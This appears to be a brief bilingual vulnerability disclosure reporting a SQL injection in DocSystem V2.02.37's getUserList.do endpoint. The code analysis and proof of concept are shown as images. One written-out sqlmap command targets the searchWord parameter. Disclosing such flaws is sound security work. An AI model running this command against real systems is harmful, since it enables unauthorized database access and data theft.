# Vulnerability Introduction（漏洞简介）

The /Manage/getUserList.do interface of DocSystemV2.02.37 has a SQL injection vulnerability.，Attackers can obtain sensitive database information or take over database or even server permissions through this sql injection vulnerability（DocSystemV2.02.37的/Manage/getUserList.do接口存在SQL注入漏洞。攻击者可以通过此SQL注入漏洞获取敏感的数据库信息，或接管数据库甚至服务器权限）

supplier:https://github.com/RainyGao-GitHub/DocSys/releases/tag/DocSys_V2.02.37

Vulnerability file:com/DocSystem/mapping/UserMapper.xml

# Vulnerability analysis and reproduction（漏洞分析复现）

code analysis

![image-20251228183933700](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/DocSys/image-20251228183933700.lw7bwhrfc.webp)

![image-20251228184010760](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/DocSys/image-20251228184010760.67xxprj28n.webp)

poc

![image-20251228184022387](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/DocSys/image-20251228184022387.8adqdthn9x.webp)

![image-20251228184042711](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/DocSys/image-20251228184042711.4g4yuuzpck.webp)

python sqlmap.py -r 1.txt -p searchWord --batch --level 3 --risk 3

![image-20251228184100081](https://github.com/xkalami-Tta0/picx-images-hosting/raw/master/DocSys/image-20251228184100081.2h8s4iu70y.webp)
